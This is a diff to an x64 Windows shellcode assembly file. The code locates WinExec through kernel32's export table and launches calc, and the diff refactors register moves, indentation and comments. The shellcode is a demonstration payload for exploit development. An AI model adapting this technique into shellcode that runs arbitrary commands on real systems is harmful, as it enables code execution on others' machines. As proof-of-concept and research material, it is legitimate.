@@ -11,14 +11,16 @@ SECTION .text
 %include 'type-conversion.asm'
 
 %ifndef PLATFORM_INDEPENDENT
-global shellcode
-shellcode:
+  global shellcode
+  shellcode:
 %endif
 
 %ifdef STACK_ALIGN
     AND     SPL, 0xF8
 %endif
 
+; Note to self: instructions on 32-bit registers are automatically zero-extended to 64-bits.
+; This means LODSD will set the high DWORD of RAX to 0.
 %ifndef PLATFORM_INDEPENDENT
     PUSH    BYTE 0x60                     ; 
     POP     RCX                           ; RCX = 0x60
@@ -36,9 +38,9 @@ shellcode:
 ; PE header (RDI+RCX-0x60) = @0x00 0x04 byte signature
 ;                            @0x04 0x18 byte COFF header
 ;                            @0x18      PE32 optional header (= RDI + RCX - 0x60 + 0x18)
-    MOVSX   RBX, DWORD [RDI + RCX - 0x60 + 0x18 + 0x70] ; RBX = [PE32+ optional header + offset(PE32+ export table offset)] = offset(export table)
+    MOV     EBX, DWORD [RDI + RCX - 0x60 + 0x18 + 0x70] ; RBX = [PE32+ optional header + offset(PE32+ export table offset)] = offset(export table)
 ; Export table (RDI+ECX) = @0x20 Name Pointer RVA
-    MOVSX   RSI, DWORD [RDI + RBX + 0x20] ; RSI = [kernel32 + offset(export table) + 0x20] = offset(names table)
+    MOV     ESI, DWORD [RDI + RBX + 0x20] ; RSI = [kernel32 + offset(export table) + 0x20] = offset(names table)
     ADD     RSI, RDI                      ; RSI = kernel32 + offset(names table) = &(names table)
 ; Found export names table (RSI)
     MOV     ECX, DWORD [RDI + RBX + 0x24] ; ECX = [kernel32 + offset(export table) + 0x20] = offset(ordinals table)
@@ -52,7 +54,7 @@ find_winexec_x64:
     LODSD                                 ; RAX = &(names table[function number]) = offset(function name)
     CMP     DWORD [RDI + RAX], B2DW('W', 'i', 'n', 'E') ; *(DWORD*)(function name) == "WinE" ?
     JNE     find_winexec_x64              ;
-    MOV     ESI, DWORD [RDI + RBX + 0x1C] ; RSI = [kernel32 + offset(export table) + 0x1C] = offset(address table)] = offset(address table)
+    MOV     ESI, DWORD [RDI + RBX + 0x1C] ; RSI = [kernel32 + offset(export table) + 0x1C] = offset(address table)
     ADD     RSI, RDI                      ; RSI = kernel32 + offset(address table) = &(address table)
     MOV     ESI, [RSI + RBP * 4]          ; RSI = &(address table)[WinExec ordinal] = offset(WinExec)
     ADD     RDI, RSI                      ; RDI = kernel32 + offset(WinExec) = WinExec
@@ -61,6 +63,6 @@ find_winexec_x64:
     PUSH    RSP
     POP     RCX                           ; RCX = &("calc")
     SUB     RSP, 0x20                     ; WinExec messes with stack - 
-    CQO                                   ; RDX = 0
+    CDQ                                   ; RDX = 0 (assumping EAX < 0x80000000)
     CALL    RDI                           ; WinExec(&("calc"), 0);
     INT3                                  ; Crash
